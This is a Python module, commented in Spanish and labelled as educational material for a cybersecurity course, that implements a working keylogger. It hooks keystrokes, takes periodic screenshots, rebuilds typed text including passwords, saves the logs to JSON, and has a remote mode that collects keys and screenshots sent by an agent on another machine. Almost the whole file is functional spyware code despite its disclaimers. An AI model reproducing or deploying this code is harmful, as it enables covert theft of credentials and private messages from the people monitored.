"""
Módulo de Keylogger Educativo
Utiliza la librería 'keyboard' para capturar las pulsaciones de teclas.

NOTA EDUCATIVA: Para poder diseñar un anti-keylogger es necesario entender
cómo funciona un keylogger con la finalidad de tener mayor seguridad
en la red digital.

Este módulo soporta dos modos:
  - LOCAL:  captura teclas en la máquina donde corre el servidor Flask.
  - REMOTO: recibe teclas enviadas por remote_agent.py desde
            otra máquina en el ambiente controlado de laboratorio.

Este módulo es EXCLUSIVAMENTE con fines educativos para la materia de
Ciberseguridad. El uso indebido de keyloggers es ilegal.
"""

import keyboard
from datetime import datetime
import threading
import os
import json
import base64
import io

# Captura de pantalla
try:
    import mss
    import mss.tools
    from PIL import Image
    _SCREENSHOT_AVAILABLE = True
except ImportError:
    _SCREENSHOT_AVAILABLE = False


class Keylogger:
    """
    Keylogger educativo que registra pulsaciones de teclas.
    Demuestra cómo un atacante puede capturar todo lo que escribe
    un usuario, incluyendo contraseñas, mensajes, etc.
    """
    
    def __init__(self):
        self.keys_log = []
        self.is_running = False
        self.start_time = None
        self.hook = None
        # ── Capturas de Pantalla ────────────────────────────────────────
        self.screenshots = []  # Lista de dicts {timestamp, data(base64), index}

        # ── Modo Remoto ──────────────────────────────────────────────
        self._remote_keys: list = []
        self._remote_screenshots: list = []
        self._remote_lock = threading.Lock()
        self._remote_agent_info: dict = {}
        self._remote_complete: bool = False
    
    def _on_key_event(self, event):
        """Callback cuando se presiona una tecla."""
        if event.event_type == 'down':
            key_info = {
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3],
                'key': event.name,
                'key_code': event.scan_code,
                'type': self._classify_key(event.name)
            }
            self.keys_log.append(key_info)
    
    def _classify_key(self, key_name):
        """Clasifica el tipo de tecla capturada."""
        special_keys = {
            'space': 'espacio', 'enter': 'enter', 'tab': 'tabulación',
            'backspace': 'borrar', 'delete': 'suprimir', 'escape': 'escape',
            'shift': 'modificador', 'ctrl': 'modificador', 'alt': 'modificador',
            'caps lock': 'modificador', 'left shift': 'modificador',
            'right shift': 'modificador', 'left ctrl': 'modificador',
            'right ctrl': 'modificador', 'left alt': 'modificador',
            'right alt': 'modificador', 'left windows': 'modificador',
            'right windows': 'modificador',
            'up': 'navegación', 'down': 'navegación',
            'left': 'navegación', 'right': 'navegación',
            'home': 'navegación', 'end': 'navegación',
            'page up': 'navegación', 'page down': 'navegación',
        }
        
        if key_name in special_keys:
            return special_keys[key_name]
        
        # Teclas de función
        if key_name.startswith('f') and key_name[1:].isdigit():
            return 'función'
        
        # Caracteres normales (letras, números, símbolos)
        if len(key_name) == 1:
            if key_name.isalpha():
                return 'letra'
            elif key_name.isdigit():
                return 'número'
            else:
                return 'símbolo'
        
        return 'especial'
    
    def _take_screenshot(self):
        """
        Toma una captura de pantalla y la devuelve como string Base64 (PNG).
        Retorna None si la captura de pantalla no está disponible.
        """
        if not _SCREENSHOT_AVAILABLE:
            return None
        try:
            with mss.mss() as sct:
                raw = sct.grab(sct.monitors[0])
                img = Image.frombytes('RGB', raw.size, raw.bgra, 'raw', 'BGRX')
                # Reducir tamaño para no saturar la red (max 1280px de ancho)
                if img.width > 1280:
                    ratio = 1280 / img.width
                    img = img.resize(
                        (1280, int(img.height * ratio)),
                        Image.LANCZOS
                    )
                buf = io.BytesIO()
                img.save(buf, format='JPEG', quality=70)
                return base64.b64encode(buf.getvalue()).decode('utf-8')
        except Exception:
            return None

    def start(self, duration=10, screenshot_interval=5):
        """
        Inicia la captura de teclas y capturas de pantalla periódicas.

        Args:
            duration:            Duración máxima en segundos (máx 30)
            screenshot_interval: Cada cuántos segundos tomar captura (0 = desactivado)
        """
        if self.is_running:
            return {'success': False, 'error': 'El keylogger ya está en ejecución.'}
        
        if duration < 1:
            return {'success': False, 'error': 'La duración mínima es 1 segundo.'}
        if duration > 30:
            duration = 30
        
        self.keys_log = []
        self.screenshots = []
        self.is_running = True
        self.start_time = datetime.now()
        
        try:
            stop_event = threading.Event()

            # Hook del teclado
            keyboard.on_press(self._on_key_event)

            # ── Hilo de capturas de pantalla ────────────────────────────
            if screenshot_interval > 0 and _SCREENSHOT_AVAILABLE:
                def screenshot_loop():
                    idx = 0
                    while not stop_event.is_set():
                        stop_event.wait(screenshot_interval)
                        if stop_event.is_set():
                            break
                        img_b64 = self._take_screenshot()
                        if img_b64:
                            idx += 1
                            self.screenshots.append({
                                'index': idx,
                                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                                'data': img_b64
                            })
                scr_thread = threading.Thread(target=screenshot_loop, daemon=True)
                scr_thread.start()

            # Timer de duración
            timer = threading.Timer(duration, stop_event.set)
            timer.start()
            stop_event.wait()
            timer.cancel()

            # Detener captura
            keyboard.unhook_all()
            self.is_running = False
            
            captured_text = self._reconstruct_text()
            stats = self._generate_stats()
            
            return {
                'success': True,
                'keys': self.keys_log,
                'total_keys': len(self.keys_log),
                'duration': duration,
                'captured_text': captured_text,
                'stats': stats,
                'screenshots': self.screenshots,
                'total_screenshots': len(self.screenshots),
                'screenshots_available': _SCREENSHOT_AVAILABLE
            }
            
        except Exception as e:
            keyboard.unhook_all()
            self.is_running = False
            return {
                'success': False,
                'error': f'Error en el keylogger: {str(e)}'
            }
    
    def stop(self):
        """Detiene la captura de teclas."""
        if self.is_running:
            keyboard.unhook_all()
            self.is_running = False
            return {'success': True, 'message': 'Keylogger detenido.'}
        return {'success': False, 'error': 'El keylogger no está en ejecución.'}
    
    def _reconstruct_text(self):
        """
        Reconstruye el texto que escribió el usuario a partir de las teclas.
        Esto demuestra lo peligroso de un keylogger: puede reconstruir
        contraseñas, mensajes, y toda la información escrita.
        """
        text = ''
        for key in self.keys_log:
            name = key['key']
            if name == 'space':
                text += ' '
            elif name == 'enter':
                text += '\n'
            elif name == 'backspace':
                text = text[:-1] if text else ''
            elif name == 'tab':
                text += '\t'
            elif key['type'] in ('letra', 'número', 'símbolo'):
                text += name
            # Ignorar teclas modificadoras, navegación, etc.
        
        return text
    
    def _generate_stats(self):
        """Genera estadísticas de las teclas capturadas."""
        total = len(self.keys_log)
        types = {}
        for key in self.keys_log:
            t = key['type']
            types[t] = types.get(t, 0) + 1
        
        return {
            'total': total,
            'types': types,
            'letters': types.get('letra', 0),
            'numbers': types.get('número', 0),
            'symbols': types.get('símbolo', 0),
            'special': total - types.get('letra', 0) - types.get('número', 0) - types.get('símbolo', 0)
        }
    
    def save_log(self, filepath, keys, captured_text='', screenshots=None):
        """Guarda el registro de teclas en un archivo JSON y las capturas como imágenes."""
        try:
            directory = os.path.dirname(filepath)
            if directory and not os.path.exists(directory):
                os.makedirs(directory, exist_ok=True)

            # ── Guardar capturas de pantalla ────────────────────────────
            saved_screenshots = []
            base_path = filepath.replace('.json', '')
            if screenshots:
                for scr in screenshots:
                    img_path = f"{base_path}_screenshot_{scr['index']:02d}.jpg"
                    try:
                        img_bytes = base64.b64decode(scr['data'])
                        with open(img_path, 'wb') as f:
                            f.write(img_bytes)
                        saved_screenshots.append({
                            'index': scr['index'],
                            'timestamp': scr['timestamp'],
                            'file': os.path.abspath(img_path)
                        })
                    except Exception:
                        pass

            log_data = {
                'capture_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'total_keys': len(keys),
                'captured_text': captured_text,
                'total_screenshots': len(saved_screenshots),
                'screenshots': saved_screenshots,
                'warning': 'Este archivo es solo para fines educativos de Ciberseguridad',
                'keys': keys
            }

            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(log_data, f, indent=2, ensure_ascii=False)

            return {
                'success': True,
                'filepath': os.path.abspath(filepath),
                'total_saved': len(keys),
                'screenshots_saved': len(saved_screenshots)
            }
        except PermissionError:
            return {
                'success': False,
                'error': f'Sin permisos para escribir en: {filepath}'
            }
        except Exception as e:
            return {
                'success': False,
                'error': f'Error al guardar: {str(e)}'
            }


    # ── Métodos de Modo Remoto ────────────────────────────────────────────────

    def register_remote_agent(self, agent_info: dict):
        """
        Registra un agente remoto (remote_agent.py) y limpia capturas previas.
        """
        with self._remote_lock:
            self._remote_keys = []
            self._remote_screenshots = []
            self._remote_complete = False
            self._remote_agent_info = agent_info
        return {'success': True, 'message': f"Agente {agent_info.get('agent_ip')} registrado en modo keylogger."}

    def receive_remote_keys(self, keys: list, screenshots: list = None, final: bool = False):
        """
        Recibe un lote de teclas y/o capturas desde remote_agent.py.
        """
        with self._remote_lock:
            self._remote_keys.extend(keys)
            if screenshots:
                self._remote_screenshots.extend(screenshots)
            if final:
                self._remote_complete = True
        return {'success': True, 'received': len(keys), 'screenshots_received': len(screenshots or [])}

    def get_remote_results(self):
        """
        Devuelve las teclas y capturas acumuladas hasta el momento.
        """
        with self._remote_lock:
            keys = list(self._remote_keys)
            screenshots = list(self._remote_screenshots)
            complete = self._remote_complete
            agent = dict(self._remote_agent_info)

        captured_text = self._reconstruct_text_from(keys)
        stats = self._generate_stats_from(keys)
        return {
            'success': True,
            'keys': keys,
            'total_keys': len(keys),
            'captured_text': captured_text,
            'complete': complete,
            'agent': agent,
            'duration': agent.get('duration', 0),
            'stats': stats,
            'screenshots': screenshots,
            'total_screenshots': len(screenshots)
        }

    def _reconstruct_text_from(self, keys: list):
        """Reconstruye el texto a partir de una lista de teclas arbitraria."""
        text = ''
        for key in keys:
            name = key.get('key', '')
            if name == 'space':
                text += ' '
            elif name == 'enter':
                text += '\n'
            elif name == 'backspace':
                text = text[:-1] if text else ''
            elif name == 'tab':
                text += '\t'
            elif key.get('type') in ('letra', 'número', 'símbolo'):
                text += name
        return text

    def _generate_stats_from(self, keys: list):
        """Genera estadísticas a partir de una lista de teclas arbitraria."""
        total = len(keys)
        types = {}
        for key in keys:
            t = key.get('type', 'especial')
            types[t] = types.get(t, 0) + 1
        return {
            'total': total,
            'types': types,
            'letters': types.get('letra', 0),
            'numbers': types.get('número', 0),
            'symbols': types.get('símbolo', 0),
            'special': total - types.get('letra', 0) - types.get('número', 0) - types.get('símbolo', 0)
        }


# Instancia global
keylogger = Keylogger()